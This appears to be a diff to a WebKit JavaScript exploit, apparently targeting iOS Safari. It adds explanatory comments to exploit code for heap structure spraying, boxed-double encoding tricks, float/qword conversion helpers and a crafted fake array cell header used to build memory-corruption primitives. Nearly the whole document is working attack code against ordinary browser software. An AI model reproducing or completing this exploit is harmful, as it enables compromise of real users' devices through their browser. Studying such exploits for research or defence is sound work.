@@ -412,22 +412,24 @@ var qwordAsFloat = qword => { //i2f
     //data_view.setBigUint64(0, qword);
     return data_view.getFloat64(0, true);
 }
-      const kBoxedDoubleOffset = 0x0002000000000000n;
+const kBoxedDoubleOffset = 0x0002000000000000n; //around ios 13 webkit no longer use 0x0001 - 0xfffe encoding for doubles and no longer adds +0x0001
+//to JSValues instead now its 0x0002 added to js values and double now range from 0x0002-0xfffc  hence this boxed aka "JSValue" value is 0x0002
 
-    var array_spray = [];
-    for (var i = 0; i < 1000; ++i) {
+    /*var array_spray = []; // we make an array to hold our heap structure spray
+    for (var i = 0; i < 1000; ++i) { //we will now spray 1000
         array_spray[i] = [13.37+i, 13.37];
-    }
-    var structure_spray = [];
-for (var i = 0; i < 1000; ++i) {
-    var ary = [13.37];
-    ary.prop = 13.37;
-    ary['p'+i] = 13.37;
-    structure_spray.push(ary);
+    }*/ //useless now
+    var structure_spray = []; //this is an empty array to hold our other spray array doubles from the heap
+for (var i = 0; i < 1000; ++i) { //spray 1000 array no needed though it just better the odds
+    var ary = [13.37]; //this make a ArrayWithDouble i think this also is Copy On Write 
+    //ary[0] = 4.2 this changes it from Copy On Write to Non Copy on write?
+    ary.prop = 13.37; //create an inline property which i also a Double
+    ary['p'+i] = 13.37; //create another property 
+    structure_spray.push(ary); // push these arrays to structure_spray
 }
-    var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
-    unboxed1[0] = 4.2; // no CopyOnWrite
-  //alert("hehe")
+    //var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37]; useless now
+    //unboxed1[0] = 4.2; // no CopyOnWrite useless
+  //alert("hehe") useless
       function boxDouble(d) {
         return d + kBoxedDoubleOffset;
       }
@@ -435,7 +437,7 @@ for (var i = 0; i < 1000; ++i) {
         return d - kBoxedDoubleOffset;
       }
       // the structure ID is wrong, but we'll fix it :)
-      let doubleArrayCellHeader = 0x0108230700000000n;
+      let doubleArrayCellHeader = 0x0108230700000000n; //invalid headed but will be fixed later in exploit
       let f = new Float64Array(1);
       let u = new Uint32Array(f.buffer);
       function float2bigint(v) {
@@ -466,7 +468,7 @@ for (var i = 0; i < 1000; ++i) {
       // transition to unboxed double storage
       a1[3] = 13.37;
       let b0 = [0,0,0,0,0,0,0,0,0,0];
-      let b1 = [{},{},13.37]//[0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
+      let b1 = [{},{},13.37] //[0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
       // put zeroes in first two slots so JSCallbackData destruction is safe
       delete b1[0];
       delete b1[1];
